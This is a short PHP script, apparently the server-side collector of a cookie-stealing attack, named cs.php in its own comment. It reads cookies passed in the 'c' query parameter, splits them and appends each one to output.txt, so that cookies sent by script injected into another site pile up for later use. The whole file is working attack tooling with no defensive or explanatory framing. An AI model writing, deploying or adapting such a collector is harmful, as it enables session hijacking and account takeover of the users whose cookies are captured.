<?php

#cs.php?c=isset
if (isset($_GET['c'])) {

	#Seperate each cookie into an array
	$cookies = explode(' ', $_GET['c']);

	#Open file in append mode
	$fp = fopen('output.txt', 'a');

	#Write cookies to file
	foreach($cookies as $cookie) {
		fwrite($fp, $cookie . "\r\n");
	}

	fclose($fp);
	unset($cookies);
}

?>
